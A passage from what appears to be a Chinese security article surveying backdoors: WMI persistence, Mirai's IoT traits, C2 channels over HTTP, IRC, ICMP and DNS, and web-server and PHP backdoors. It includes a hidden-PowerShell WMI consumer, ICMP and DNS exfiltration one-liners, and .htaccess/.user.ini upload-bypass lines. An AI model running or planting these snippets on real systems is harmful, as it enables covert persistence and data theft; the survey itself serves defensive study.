    #$encCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
    $commandLine = "C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -NoP -NonI -w hidden -Command $command"  
    $ConsumerArgs = @{
        Name=$ConsumerName
        CommandLineTemplate=$commandLine
    }
    $consumer = Set-WmiInstance -Class "CommandLineEventConsumer" -Namespace $NS -Arguments $ConsumerArgs
    #Bind filter and consumer
    $Args = @{
       Filter = $Filter
       Consumer = $consumer
    }
    Set-WmiInstance -Class "__FilterToConsumerBinding" -Namespace "rootsubscription" -Arguments $Args
也出现过一些流氓软件比如xxx使用这种方式来达到“删不掉”的效果。
**三. IOT后门**
物联网的脆弱性因[Mirai](https://github.com/jgamblin/Mirai-Source-Code)恶意软件的肆用而不断凸显，特别是弱口令的泛滥、致使了大批物联网设备沦陷。其中造成的危害不言而喻，不但可以耗用其资源，更可怕的是可能利用设备本身的功能造成意料不到的伤害。如果单单从技术的角度上讲，Mirai确实是一款非常优秀的恶意软件。在这里，我们只讨论它们的后门特性：
1.进程
对于运行时进程的处理，Mirai采用的是进程名随机，也算是为了不被特征提取所采取的一个措施。
2.防重启
因为IOT设备的特殊性，无法将程序写进设备中，只能驻留在内存里，所以需不能使设备重启。在固件里，有一进程会不断向watchdog进程发送一字节数据，如果没有该操作，设备则会重启。Mirai采取的是关闭watchdog的功能。
3.通信协议
该过程可以分为
上线过程：bot发送x00x00x00x01，得到回应后再发送x00；
心跳过程：bot间隔60s发送x00x00cnc，cnc回应x00x00；
解析执行：cnc对bot发出的指令里采取了一定的格式。
[target_num] 02 [IP] 08 08 08 08 [MASK] 20 [IP] 07 07 07 07 [MASK] 20
…..
IOT设备后门的重点往往是在其功能的实现上，而不是在后门的persistence上，因为IOT设备一旦被突破，几乎入无人之境，恶意软件会合理地最大化利用其中的资源。
**通信方式类**
后门的网络通信行为同样是防火墙的侦查重点，在复杂的实际环境下，怎么把被控端的数据回传成为了一个难点。对于不同的防火墙，其使用的策略也有些不同。
下面以后门通信方式分类来为大家讲解：
**1\. http/https型**
目前可以说这是最流行的通信方式，可借用第三方的api来实现回连功能，从很大程度上讲解决了很多困难。像在github
star比较高的，如[twittor](https://github.com/PaulSec/twittor)、[gcat](https://github.com/byt3bl33d3r/gcat)等，从代码上看不会有太大问题，主要是完成了对相应第三方应用的api调用以及功能的实现，但是这种第三方选取并不合理，它会造成溯源十分容易。先不论gmail的实名制，问题的关键在于被控端只能共享一个或几个gmail帐号，当其中一个被控端被追查后，其它的被控端很可能就处于危险状态。
根据经验来看，如果真要借助第三方的网站来完成通信，比较常用的是论坛、网盘等，可以将被控端各自的权限分离开来。在很多APT报告中，我们可看到dropbox及reddit快成为远控木马的重灾区，官方当然也出台了一些措施来制止这种行为。
这部分木马可参考nishang框架中的HTTP-Backdoor脚本。
总的来讲，这种适合于比较小型的，不适合于大型僵尸网络。在国内这种类型的网站基本需要实名制，以官方的力量来追踪是十分容易的。危害小则被封号，大则查水表。
目前对于追踪的问题主流采取的是DGA(Domain Generation Algorithm)，自建服务器。
攻击者和被控段以同样的算法和种子算出一系列域名，种子的约定可以是日期，可以是天气等。攻击者注册其中的一个或多个域名。这样的好处是反汇编难度大，算法不易被破解。即使被破解了，安全人员还需抢在攻击者之前及时注册生成的大量域名，费时费钱费力。
更多详细的可参考[《C&C控制服务的设计和侦测方法综述》](http://netsecurity.51cto.com/art/201511/496382.htm)
**2\. irc型**
irc的木马优点很多，比如管理方便，便于远控协调分工，channel隐藏，追溯难。
缺点很明显，国内只有较少的用户使用irc，用户防火墙可能会拦截该流量，具体情况根据地区而定。
关于这部分irc木马的中文实例资料可参考：
**3\. icmp型**
ICMP通信协议中可看到在最后空余了很大的data段，名为数据缓冲区，可填充60000多字节。因此，可将被控端得到的数据放入其中：
    $cmd = ls;
    $timeout = 1000;
    $server_ip = 'xxxx';
    (New-Object System.Net.NetworkInformation.Ping).Send($server_ip, $timeout, $cmd)
在server_ip上抓包可看到返回结果。
**4\. dns型**
DNS原理在这不过多展开，这种类型的逃逸方法一般是用自己申请的域名，将NS记录指向搭建的NS服务器上，使用DNS泛解析，把用户所查询关于该域名的信息记录下来。
    ping -c 2 `whoami`.xxxx.ceye.io
或者
    nslookup -querytype=txt $data.ns.lynahex.com 8.8.8.8
不过使用如上的常规方法，似乎会对data长度有限制。
自建NS服务器的源码可看[NoEye](https://github.com/KibodWapon/NoEye)
（题外话：有的厂商从数据库中查询指定域名的txt记录时并未过滤，可能会有sql注入。:-D。）
该类流行的木马可参考[dnscat2](https://github.com/iagox86/dnscat2),它涉及了更底层的包构造，即使没有域名，也可使用该协议进行通信。
具体用法如下：
……
总的来说，这类后门依赖于上层协议，符合人们常用协议的范围，同时，攻击者也在探寻新兴的协议来exfiltrate。
**网站类**
传统的后门中自然少不了该类型，从用户发出数据请求开始到最终落入网站的数据库中，经过服务端的每一环节都有可能成为攻击者利用的地方。
**1\. 模块扩展型**
中间件之所以能被利用，是因为它们的可扩展性，当布置完模块或插件时，中间件无法判断开发者的行为是否为恶意。
1.1 apache
将后门增加到apache模块目录中，攻击者只需要简单地发起一个请求就可拿到root权限的shell，并且没有任何日志记录。最出名的莫过于mod_rootme
具体操作可参考：
1.2 nginx
nginx占有内存少，并发能力强，受到很多用户的喜爱。它可很方便地添加和升级模块，同理，pwnginx作为经典的后门也是应用了该原理，程序员只需将正常的功能稍微改动，就能达到另一面的效果。
具体操作可参考：
1.3 iis
iis后门是用了iis本身的机制，当在http头里增加一字段即可触发后门，并执行发过来的命令。
具体原理和操作可参考：
中间件的后门大多是以类似上述原理为基础的。
1.4 PHP扩展库
同理，将编译好的so文件添加到php.ini的extension中。当模块被初始化时，会去加载执行我们的代码。当发送特定参数的字符串过去时，即可触发后门。
具体操作可参考：
……
**2\. 后端语言型**
这类后门在新型框架和语言的兴起下，影响力有些稍稍减弱。主要原因是现主流框架都采取路由的方式来映射url，有时攻击者即使上传完后门，也有可能无法找到对应的路由映射方式。站在不同人群的角度来看后门也别有一番风情。下面分为开发者后门和攻击者使用的后门，其中针对攻击者的后门是以PHP为例。
2.1 开发者后门
有时开发者也会在代码中留下后门，比如x博CMS。它通常是一些奇怪的代码，稍微动态调试下可分析出后门，这是属于比较低级的，更高级的的后门是逻辑和理论相关的漏洞，在defcon23上进行的“卑鄙密码竞赛”，曾经wooyun有介绍，有的参赛者将密码学的知识和PHP特性相结合，并以一定的逻辑性代码迷惑大多数人。虽然不难，但能想出这点子实在难能可贵。更为有趣的是，即使被发现了也可当作是个漏洞处理，舆论不会偏向于说这是开发者留下的后门。
另外一方面，后门不一定直接出现在产品中，可能也会存在库中或编译好的文件里，比如nodesjs仓库或pyc后门。
2.2 PHP后门
随着时代的变迁，木马的重心也随着转移。前10年里，PHP马看重的是功能，而如今则是免杀以及绕waf的能力，具体来说，指的是木马静态文件的免杀和通信流量的无特征。
在实战中，主要采取的方法为混淆编码、字符替换等，还可利用解释性语言的特性以及其回调机制。对于通信流量方面，一般采取对称加密，如DES，而不是编码等。比较成熟的后门是weevely，也可根据需求将菜刀完善，把流量加密。
3\. 配置文件型
该类型后门主要是通过阅读相关官方文档来挖掘发现，主要应用场景是bypass上传文件的黑名单。
以PHP语言为例：
3.1 .htaccess后门
在.htaccess中添加php解析的新后缀并上传，之后上传该后缀的木马即可。
    AddType application/x-httpd-php .abc
3.2 .user.ini后门
.user.ini相当于用户自定义的php.ini。
上传.user.ini，其中的内容为：
    auto_prepend_file=xx.gif
可以让该目录下的所有php文件自动包含xx.gif，我们直接上传xx.gif作为木马。不过较大的限制是该目录下必须要有正常的php文件才能使得xx.gif中的代码执行。
……
**总结**
本文从多个纬度讲述了五花八门的后门，需求有多大，后门就会有多少。后门并不神奇，它无处不在，可能隐匿于正常功能中，隐匿于我们的身边。就如余弦说的那样，“以邪气的眼光看世界”，“每一名程序员都可以成为黑客”。后门也只是一段代码，只不过有时会充满无尽的想象力，这也是无穷的魅力所在。
**参考资料**
wooyun-drops